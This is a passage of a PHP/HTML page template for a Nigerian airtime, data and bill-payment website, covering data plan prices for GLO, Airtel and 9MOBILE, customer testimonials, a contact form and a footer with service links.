									<a href="<?php echo $baseurl; ?>/login" class="btn choose_package">Shop Now</a>
								</div>
							</div>
						</div>
														
						<div class="col-lg-3 col-md-4">
							<div class="pricing_wrap">
								<div class="prt_head">
									<h4>GLO</h4>
								</div>
								<div class="prt_price">
									<h2><span>₦</span><?php echo $glo_guest; ?>460</h2>
									<span></span>
								</div>
								<div class="prt_body" style="text-align: center;">
									<ul>
										<li>One	Month Valid</li>
										<li>Support	4G LITE</li>
										<li>Hotspot	Sharing</li>
										<li>Laptop	Usage</li>
									
									</ul>
								</div>
								<div class="prt_footer">
									<a href="<?php echo $baseurl; ?>/login" class="btn choose_package">Shop Now</a>
								</div>
							</div>
						</div>
									

					<div class="col-lg-3 col-md-4">
							<div class="pricing_wrap">
								<div class="prt_head">
									<h4>AIRTEL</h4>
								</div>
								<div class="prt_price">
									<h2><span>₦</span><?php echo $airtel_guest; ?>210</h2>
									<span></span>
								</div>
								<div class="prt_body" style="text-align: center;">
									<ul>
										<li>One	Month Valid</li>
										<li>Support	4G LITE</li>
										<li>Hotspot	Sharing</li>
										<li>Laptop	Usage</li>
									
									</ul>
								</div>
								<div class="prt_footer">
									<a href="<?php echo $baseurl; ?>/login" class="btn choose_package">Shop Now</a>
								</div>
							</div>
						</div>
									

							
						<div class="col-lg-3 col-md-4">
							<div class="pricing_wrap">
								<div class="prt_head">
									<h4>9MOBILE</h4>
								</div>
								<div class="prt_price">
									<h2><span>₦</span><?php echo 
									$mobile_guest;
									?> 850</h2>
									<span></span>
								</div>
								<div class="prt_body"  style="text-align: center;">
									<ul>
										<li>One	Month Valid</li>
										<li>Support	4G LITE</li>
										<li>Hotspot	Sharing</li>
										<li>Laptop	Usage</li>
									
									</ul>
								</div>
								<div class="prt_footer">
									<a href="<?php echo $baseurl; ?>/login" class="btn choose_package">Shop Now</a>
								</div>
							</div>
						</div>
														
												<!-- Single Package -->

						
					</div>
					
				</div>
			</section>
				<div class="clearfix"></div>
	<section class="gray">
				<div class="container">
				
					<div class="row justify-content-center">
						<div class="col-lg-7 col-md-8">
							<div class="sec-heading center">
								<h2>Our Customer <span class="theme-cl">Reviews</span></h2>
								</div>
						</div>
					</div>
					
					<div class="row justify-content-center">
						<div class="col-xl-12 col-lg-12 col-sm-12">
							
							<div class="reviews-slide space">
								
								<!-- Single Item -->
								<div class="single_items lios_item">
									<div class="_testimonial_wrios shadow_none">
										<div class="_testimonial_flex">
											<div class="_testimonial_flex_first">
												<div class="_tsl_flex_thumb">
														<img src="view/ass/img/test.png" class="img-fluid" alt="">
												</div>
												<div class="_tsl_flex_capst">
													<h5>Mr. Ganiyu Taiwo</h5>
													<div class="_ovr_posts"><span>Customer</span></div>
													<div class="_ovr_rates"><span><i class="fa fa-star"></i></span>4.7</div>
												</div>
											</div>
										
										</div>
										
										<div class="facts-detail">
											<p><?php echo $sitename; ?> are the best because they are able to delight customers with constant access and answers to their FAQs.</p>
										</div>
									</div>
								</div>
								
								<!-- Single Item -->
								<div class="single_items lios_item">
									<div class="_testimonial_wrios shadow_none">
										<div class="_testimonial_flex">
											<div class="_testimonial_flex_first">
												<div class="_tsl_flex_thumb">
														<img src="view/ass/img/test.png" class="img-fluid" alt="">
												</div>
												<div class="_tsl_flex_capst">
													<h5>Ishaq Monsur Ademola</h5>
													<div class="_ovr_posts"><span>Customer</span></div>
													<div class="_ovr_rates"><span><i class="fa fa-star"></i></span>4.8</div>
												</div>
											</div>
										
										</div>
										
										<div class="facts-detail">
											<p> Keep up the good job <?php echo $sitename; ?>, always fast and reliable.</p>
										</div>
									</div>
								</div>
								
								<!-- Single Item -->
								<div class="single_items lios_item">
									<div class="_testimonial_wrios shadow_none">
										<div class="_testimonial_flex">
											<div class="_testimonial_flex_first">
												<div class="_tsl_flex_thumb">
													<img src="view/ass/img/test.png" class="img-fluid" alt="">
												</div>
												<div class="_tsl_flex_capst">
													<h5>Odekunle Abdul-Tawab Opeyemi</h5>
													<div class="_ovr_posts"><span>Customer</span></div>
													<div class="_ovr_rates"><span><i class="fa fa-star"></i></span>4.9</div>
												</div>
											</div>
										
										</div>
										
										<div class="facts-detail">
											<p>Oh my God! Don't know what to say but it is cool to partner with this platform. They have provided me all the best i want. Thank you.</p>
										</div>
									</div>
								</div>
								
								<!-- Single Item -->
								<div class="single_items lios_item">
									<div class="_testimonial_wrios shadow_none">
										<div class="_testimonial_flex">
											<div class="_testimonial_flex_first">
												<div class="_tsl_flex_thumb">
													<img src="view/ass/img/test.png" class="img-fluid" alt="">
												</div>
												<div class="_tsl_flex_capst">
													<h5>Adegboye Abdulhahi</h5>
													<div class="_ovr_posts"><span>Customer</span></div>
													<div class="_ovr_rates"><span><i class="fa fa-star"></i></span>4.7</div>
												</div>
											</div>
										
										</div>
										
										<div class="facts-detail">
											<p>Great!!! EVerything is cool with <?php echo $sitename; ?> The admin is super-active because he gave response to all my request. Love.</p>
										</div>
									</div>
								</div>
								
								<!-- Single Item -->
								<div class="single_items lios_item">
									<div class="_testimonial_wrios shadow_none">
										<div class="_testimonial_flex">
											<div class="_testimonial_flex_first">
												<div class="_tsl_flex_thumb">
														<img src="view/ass/img/test.png" class="img-fluid" alt="">
												</div>
												<div class="_tsl_flex_capst">
													<h5>D-Developer</h5>
													<div class="_ovr_posts"><span>Customer</span></div>
													<div class="_ovr_rates"><span><i class="fa fa-star"></i></span>4.7</div>
												</div>
											</div>
										
										</div>
										
										<div class="facts-detail">
											<p>Wow. This is a legit datahub for me. I haven't disappointed my customers since they never disappoint me too. Thank you for your usual action. Cheers Guys!</p>
										</div>
									</div>
								</div>
							
							</div>
						
						</div>
					</div>
					
				</div>
			</section>
				<div class="clearfix"></div>
			<!-- ============================ article End ================================== -->
			
	
		<!-- ============================ Call To Action ================================== -->
			<section class="theme-bg call_action_wrap-wrap">
				<div class="container">
					<div class="row">
						<div class="col-lg-12">
							
							<div class="call_action_wrap">
								<div class="call_action_wrap-head">
									<h3>Do You Have Questions ?</h3>
									<span>We'll help you to grow your career and growth.</span>
								</div>
								<a href="<?php echo $mainpage; ?>/Contact" class="btn btn-call_action_wrap">Contact Us Today</a>
							</div>
							
						</div>
					</div>
				</div>
				

    </div>

  </div>
			</section>
			<!-- ============================ Call To Action End ================================== -->
			<section id="contact" class="contact">
  <div class="container" data-aos="fade-up">
 <center> <strong>Contact Us </strong>  </center>
 
    <div class="row gy-4 mt-4">

      <div class="col-lg-4">

        <div class="info-item d-flex">
          <i class="bi bi-geo-alt flex-shrink-0"></i>
          <div>
            <h4>Location:</h4>
            <p><?php echo $address; ?></p>
          </div>
        </div><!-- End Info Item -->

        <div class="info-item d-flex">
          <i class="bi bi-envelope flex-shrink-0"></i>
          <div>
            <h4>Email:</h4>
            <p>info@<?php echo $domain; ?></p>
          </div>
        </div><!-- End Info Item -->

        <div class="info-item d-flex">
          <i class="bi bi-phone flex-shrink-0"></i>
          <div>
            <h4>Call:</h4>
            <p><?php echo $contact_no; ?></p>
          </div>
        </div><!-- End Info Item -->

      </div>

      <div class="col-lg-8">
        <form action="forms/contact.php" method="post" role="form" class="php-email-form">
          <div class="row">
            <div class="col-md-6 form-group">
              <input type="text" name="name" class="form-control" id="name" placeholder="Your Name" required>
            </div>
            <div class="col-md-6 form-group mt-3 mt-md-0">
              <input type="email" class="form-control" name="email" id="email" placeholder="Your Email" required>
            </div>
          </div>
          <div class="form-group mt-3">
            <input type="text" class="form-control" name="subject" id="subject" placeholder="Subject" required>
          </div>
          <div class="form-group mt-3">
            <textarea class="form-control" name="message" rows="5" placeholder="Message" required></textarea>
          </div>
          <div class="my-3">
            <div class="loading">Loading</div>
            <div class="error-message"></div>
            <div class="sent-message">Your message has been sent. Thank you!</div>
          </div>
          <div class="text-center"><button type="submit">Send Message</button></div>
        </form>
      </div><!-- End Contact Form -->

    </div>

  </div>
</section><!-- End Contact Section -->

			<!-- ============================ Footer Start ================================== -->
			<footer class="dark-footer skin-dark-footer style-2">
				<div class="footer-middle">
					<div class="container">
						<div class="row">
							
							<div class="col-lg-5 col-md-5">
								<div class="footer_widget">
							
									<h4 class="extream mb-3"><?php echo $sitename; ?></h4>
									<p><?php echo $sitename; ?> Enterprises is a private limited liability company registered under the Laws of the Federal Republic of Nigeria. We Are The Best
Recharge & Utility Bills Payment Platform</p>
								
								</div>
							</div>
							
							<div class="col-lg-6 col-md-7 ml-auto">
								<div class="row">
								
									<div class="col-lg-6 col-md-4">
										<div class="footer_widget">
											<h4 class="widget_title">Quick Links</h4>
											<ul class="footer-menu">
											<li><a href="<?php echo $mainpage; ?>">Home</a></li>
<li><a href="<?php echo $mainpage; ?>/about">About</a></li>
<li><a href="<?php echo $mainpage; ?>/contact">Contact</a></li>
<li><a href="<?php echo $baseurl; ?>/register">Register</a></li>
<li><a href="<?php echo $baseurl; ?>/login">Login</a></li>
											</ul>
										</div>
									</div>
											
									<div class="col-lg-6 col-md-4">
										<div class="footer_widget">
											<h4 class="widget_title">Services</h4>
											
											<ul class="footer-menu">
											<li><a href="<?php echo $baseurl; ?>/login">Airtime Recharge</a></li>
<li><a href="#">Airtime To Cash</a></li>
<li><a href="<?php echo $baseurl; ?>/login">Data Recharge</a></li>
<li><a href="<?php echo $baseurl; ?>/login">Decoder Tv Subscription</a></li>
<li><a href="<?php echo $baseurl; ?>/login">Electricity Bill</a></li>
<li><a href="<?php echo $baseurl; ?>/login">Exam Pin Checker</a></li>
											</ul>
										</div>
									</div>
							
								
									
								</div>
							</div>
						</div>
					</div>
				</div>
				
				<div class="footer-bottom">
					<div class="container">
						<div class="row align-items-center">
							<div class="col-lg-12 col-md-12 text-center">
								 <div class="copyright">
        &copy; Copyright <strong><span><?php echo $sitename; ?></span></strong>. All Rights Reserved
      </div>
							</div>
						</div>
					</div>
				</div>
			</footer>
			<!-- ============================ Footer End ================================== -->
			
		
			<a href="#" class="scroll-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
			

		</div>
		<!-- ============================================================== -->
		<!-- End Wrapper -->
		<!-- ============================================================== -->

		<!-- ============================================================== -->
		<!-- All Jquery -->
		<!-- ============================================================== -->
		<script src="view/assets/js/jquery.min.js"></script>
		<script src="view/assets/js/popper.min.js"></script>
		<script src="view/assets/js/bootstrap.min.js"></script>
		<script src="view/assets/js/select2.min.js"></script>
		<script src="view/assets/js/slick.js"></script>
		<script src="view/assets/js/moment.min.js"></script>
		<script src="view/assets/js/daterangepicker.js"></script> 
		<script src="view/assets/js/summernote.min.js"></script>
		<script src="view/assets/js/metisMenu.min.js"></script>	
		<script src="view/assets/js/custom.js"></script>
		
		 <script src="homepage/assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="homepage/assets/vendor/purecounter/purecounter_vanilla.js"></script>
  <script src="homepage/assets/vendor/glightbox/js/glightbox.min.js"></script>
  <script src="homepage/assets/vendor/swiper/swiper-bundle.min.js"></script>
  <script src="homepage/assets/vendor/aos/aos.js"></script>
  <script src="homepage/assets/vendor/php-email-form/validate.js"></script>

  <!-- Template Main JS File -->
  <script src="homepage/assets/js/main.js"></script>
		<!-- ============================================================== -->
		<!-- This page plugins -->
		<!-- ============================================================== -->		

	</body>
</html>